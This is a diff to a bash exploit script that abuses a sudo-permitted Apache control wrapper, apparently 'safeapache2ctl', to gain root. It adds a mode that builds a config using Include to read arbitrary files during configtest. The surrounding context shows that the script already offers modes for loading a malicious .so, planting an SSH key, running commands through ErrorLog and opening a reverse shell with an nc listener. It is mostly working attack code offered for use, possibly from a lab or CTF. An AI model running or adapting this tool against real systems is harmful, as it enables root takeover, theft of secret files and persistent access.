@@ -105,6 +105,25 @@ EOF
     echo "[!] Start a listener with: nc -lvnp $LPORT"
 }
 
+make_read_conf() {
+    TARGET="$1"
+    if [[ -z "$TARGET" ]]; then
+        echo "[-] Usage: $0 read <target_file>"
+        exit 1
+    fi
+    cat > "$CONFIG_FILE" <<EOF
+ServerRoot "/etc/apache2"
+PidFile "/tmp/httpd.pid"
+ErrorLog "/tmp/apache_error.log"
+Listen 8080
+LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so
+
+Include $TARGET
+EOF
+    echo "[+] Read config ready at $CONFIG_FILE"
+    echo "[!] Run with: sudo /usr/local/bin/safeapache2ctl -f $CONFIG_FILE configtest"
+}
+
 cleanup() {
     echo "[*] Cleaning up..."
     rm -f "$SO_PAYLOAD" "$CONF_DIR/root.c" "$CONFIG_FILE" 2>/dev/null || true
@@ -115,11 +134,12 @@ cleanup() {
 
 usage() {
     echo "Usage:"
-    echo "  $0 so            # build .so payload and config (LoadFile)"
-    echo "  $0 key <pubkey>  # build CustomLog config to drop pubkey"
-    echo "  $0 cmd <command> # build ErrorLog config to run command"
+    echo "  $0 so               # build .so payload and config (LoadFile)"
+    echo "  $0 key <pubkey>     # build CustomLog config to drop pubkey"
+    echo "  $0 cmd <command>    # build ErrorLog config to run command"
     echo "  $0 rev <LHOST> <LPORT> # build ErrorLog config for reverse shell"
-    echo "  $0 clean         # remove artifacts (configs, .so, suid bash)"
+    echo "  $0 read <file>      # build Include config to read a file"
+    echo "  $0 clean            # remove artifacts (configs, .so, suid bash)"
 }
 
 banner
@@ -141,6 +161,10 @@ case "$1" in
         shift
         make_revshell_conf "$1" "$2"
         ;;
+    read)
+        shift
+        make_read_conf "$1"
+        ;;
     clean)
         cleanup
         ;;
@@ -152,5 +176,9 @@ esac
 
 if [[ "$1" != "clean" ]]; then
     echo "[*] Done. Run with:"
-    echo "    sudo /usr/local/bin/safeapache2ctl -f $CONFIG_FILE start"
+    if [[ "$1" == "read" ]]; then
+        echo "    sudo /usr/local/bin/safeapache2ctl -f $CONFIG_FILE configtest"
+    else
+        echo "    sudo /usr/local/bin/safeapache2ctl -f $CONFIG_FILE start"
+    fi
 fi
